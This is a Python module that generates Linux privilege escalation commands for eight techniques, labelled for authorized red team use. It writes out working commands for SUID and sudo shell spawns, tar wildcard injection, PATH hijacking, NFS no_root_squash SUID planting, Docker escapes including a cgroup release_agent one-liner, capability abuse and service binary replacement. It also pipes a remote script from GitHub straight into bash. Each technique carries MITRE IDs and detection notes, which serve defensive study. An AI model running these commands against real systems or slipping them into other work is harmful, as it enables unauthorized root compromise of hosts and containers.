"""
Linux privilege escalation technique generator.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

SUPPORTED_TECHNIQUES = (
    "suid_find",
    "sudo_nopasswd",
    "cron_wildcard",
    "writable_path",
    "nfs_root_squash",
    "docker_escape",
    "capabilities_abuse",
    "weak_service",
)


@dataclass
class LinuxPrivescResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


def _suid_find(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# Enumerate SUID binaries:\n"
        "find / -perm -4000 -type f 2>/dev/null | xargs ls -la\n\n"
        "# Common escalations (from GTFOBins):\n"
        "# find: find . -exec /bin/bash -p \\; -quit\n"
        "# nmap: nmap --interactive; then: !sh\n"
        "# vim: vim -c ':!bash'\n"
        "# python: python -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'\n"
        "# cp: cp /bin/bash /tmp/b && chmod +s /tmp/b && /tmp/b -p\n"
        "# bash (if SUID): /bin/bash -p\n\n"
        "# Auto-check with PEASS-ng:\n"
        "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash"
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="suid_find",
        notes="Find and exploit SUID binaries. Cross-reference with GTFOBins for exploitation paths.",
        techniques=["T1548.001"],
        risk="HIGH",
        detections=[
            "auditd: setuid bit execution by non-root (EUID change events)",
            "Process execution where effective UID != real UID",
            "find traversal of entire filesystem (noisy — high inode access rate)",
        ],
    )


def _sudo_nopasswd(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# Check sudo permissions:\n"
        "sudo -l 2>/dev/null\n\n"
        "# If (ALL) NOPASSWD found — common escalations:\n"
        "# sudo /bin/bash\n"
        "# sudo vim -c ':!bash'\n"
        "# sudo find / -exec /bin/bash \\;\n"
        "# sudo python3 -c 'import os; os.system(\"/bin/bash\")'\n"
        "# sudo awk 'BEGIN {system(\"/bin/bash\")}'\n"
        "# sudo cp /bin/bash /tmp/b && sudo chmod +s /tmp/b && /tmp/b -p\n\n"
        "# If specific binary: check GTFOBins for that binary.\n"
        "# sudo env:\n"
        "sudo env /bin/bash"
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="sudo_nopasswd",
        notes="Enumerate and abuse sudo NOPASSWD entries. Very common misconfiguration.",
        techniques=["T1548.003"],
        risk="HIGH",
        detections=[
            "sudo execution of shell/interpreter (Event: sudo logs to /var/log/auth.log)",
            "SIEM: sudo used for non-standard binary",
            "bash/sh child of sudo from non-admin user",
        ],
    )


def _cron_wildcard(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# Check for writable cron scripts or wildcard abuse:\n"
        "ls -la /etc/cron* /var/spool/cron/ 2>/dev/null\n"
        "cat /etc/crontab 2>/dev/null\n\n"
        "# Wildcard injection in tar/rsync/chown cron jobs:\n"
        "# If cron runs: tar czf /backup/out.tgz /tmp/data/*\n"
        "# In /tmp/data/:\n"
        "echo '' > '--checkpoint=1'\n"
        "echo '' > '--checkpoint-action=exec=bash privesc.sh'\n"
        f"echo '#!/bin/bash\\n{payload}' > privesc.sh\n"
        "chmod +x privesc.sh\n"
        "# Wait for cron to run — checkpoint flags become tar arguments via glob"
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="cron_wildcard",
        notes=(
            "Exploits wildcard expansion in privileged cron jobs. "
            "Targets tar/rsync/chown with unquoted wildcards. Requires write to target directory."
        ),
        techniques=["T1053.003", "T1068"],
        risk="HIGH",
        detections=[
            "Unexpected files with double-dash names (--checkpoint-action) in monitored dirs",
            "tar spawning child process other than expected archive operations",
            "auditd: file creation in world-writable directory by low-priv user",
        ],
    )


def _writable_path(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# Check PATH for writable directories:\n"
        "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type d 2>/dev/null\n\n"
        "# If a writable dir comes before /usr/bin in PATH:\n"
        "# Create fake binary that a root script calls:\n"
        f"cat > /writable-dir/{name} << 'EOF'\n"
        "#!/bin/bash\n"
        f"{payload}\n"
        "EOF\n"
        f"chmod +x /writable-dir/{name}\n"
        "# Wait for privileged script to call the binary by name"
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="writable_path",
        notes=(
            "Places malicious binary in PATH directory searched before system directories. "
            "Works when a privileged script calls a binary by name without full path."
        ),
        techniques=["T1574.007"],
        risk="HIGH",
        detections=[
            "Execution of binary from unexpected PATH location (e.g., /tmp instead of /usr/bin)",
            "auditd: execve of binary in world-writable PATH directory",
        ],
    )


def _nfs_root_squash(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# On attacker machine — check NFS exports:\n"
        "showmount -e TARGET_IP\n\n"
        "# If no_root_squash on an export:\n"
        "mount -o rw,vers=2 TARGET_IP:/exported/path /mnt/nfs\n"
        "cp /bin/bash /mnt/nfs/bash\n"
        "chmod +s /mnt/nfs/bash\n"
        "# On target — execute:\n"
        "/exported/path/bash -p"
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="nfs_root_squash",
        notes=(
            "Abuses NFS export with no_root_squash: attacker mounts share as root and "
            "creates SUID binary. Requires network access to NFS port (2049)."
        ),
        techniques=["T1210"],
        risk="CRITICAL",
        detections=[
            "NFS mount from external IP (firewall/network logs)",
            "New SUID binary created in NFS export (HIDS on NFS server)",
            "showmount -e queries (NFS portmapper logs)",
        ],
    )


def _docker_escape(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# Check if inside Docker container:\n"
        "cat /proc/1/cgroup | grep docker && ls /.dockerenv\n\n"
        "# Method 1: Privileged container — mount host filesystem:\n"
        "fdisk -l 2>/dev/null || lsblk\n"
        "mkdir /tmp/host && mount /dev/sda1 /tmp/host\n"
        "chroot /tmp/host /bin/bash\n\n"
        "# Method 2: Docker socket exposed:\n"
        "ls -la /var/run/docker.sock\n"
        "docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host /bin/bash\n\n"
        "# Method 3: cgroups v1 notify_on_release:\n"
        "d=$(dirname $(ls -x /s*/fs/c*/*/r 2>/dev/null))\n"
        "mkdir -p $d/w; echo 1 >$d/w/notify_on_release\n"
        f"t=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n"
        f"touch /o; echo \"$t/{payload}\" >$d/release_agent; sh -c \"echo 0 >$d/w/cgroup.procs\""
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="docker_escape",
        notes=(
            "Multiple Docker container escape techniques. "
            "Privileged container or exposed Docker socket are most common paths."
        ),
        techniques=["T1611"],
        risk="CRITICAL",
        detections=[
            "Container process mounting host filesystem (container runtime audit logs)",
            "Docker socket access from inside container (Falco: rule Container Drift)",
            "cgroup release_agent write from container",
        ],
    )


def _capabilities_abuse(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# Enumerate capabilities:\n"
        "getcap -r / 2>/dev/null\n\n"
        "# cap_setuid — any binary with this can escalate:\n"
        "# python3 with cap_setuid:\n"
        "python3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"\n\n"
        "# perl with cap_setuid:\n"
        "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n\n"
        "# cap_net_raw (tcpdump) — sniff but no shell\n"
        "# cap_sys_admin — mount, clone_ns, etc.:\n"
        "# Exploit via: unshare -rm /bin/bash"
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="capabilities_abuse",
        notes="Enumerate and abuse Linux capabilities set on binaries (getcap). cap_setuid is an instant root path.",
        techniques=["T1548"],
        risk="HIGH",
        detections=[
            "Process calling setuid(0) from non-root binary (auditd: SETUID)",
            "getcap/setcap commands from non-admin process",
            "Binary with cap_setuid executing shell (process tree anomaly)",
        ],
    )


def _weak_service(payload: str, name: str) -> LinuxPrivescResult:
    cmd = (
        "# Find world-writable service binaries or configs:\n"
        "systemctl list-units --type=service --state=running | awk '{print $1}' | "
        "xargs -I{} systemctl show {} -p ExecStart 2>/dev/null | grep -oP '(?<=ExecStart=)[^ ]+' | "
        "xargs -I{} ls -la {} 2>/dev/null | grep -E '^-.*w'\n\n"
        "# If service binary is writable — replace it:\n"
        f"cp {payload} /path/to/writable/service_binary\n"
        "systemctl restart target_service\n\n"
        "# Check for writable service unit files:\n"
        "find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null"
    )
    return LinuxPrivescResult(
        command=cmd,
        technique="weak_service",
        notes="Replace or modify writable service binary/unit file to execute payload as root on restart.",
        techniques=["T1543.002", "T1574"],
        risk="HIGH",
        detections=[
            "Service binary modification (auditd: write to service executable path)",
            "Unexpected service restart triggering process with different binary hash",
            "HIDS: file integrity monitoring alert on service binary",
        ],
    )


_DISPATCH = {
    "suid_find": _suid_find,
    "sudo_nopasswd": _sudo_nopasswd,
    "cron_wildcard": _cron_wildcard,
    "writable_path": _writable_path,
    "nfs_root_squash": _nfs_root_squash,
    "docker_escape": _docker_escape,
    "capabilities_abuse": _capabilities_abuse,
    "weak_service": _weak_service,
}


def generate_linux_privesc(
    technique: str,
    payload: str = "/tmp/payload.sh",
    name: str = "sysupdate",
) -> LinuxPrivescResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](payload, name)
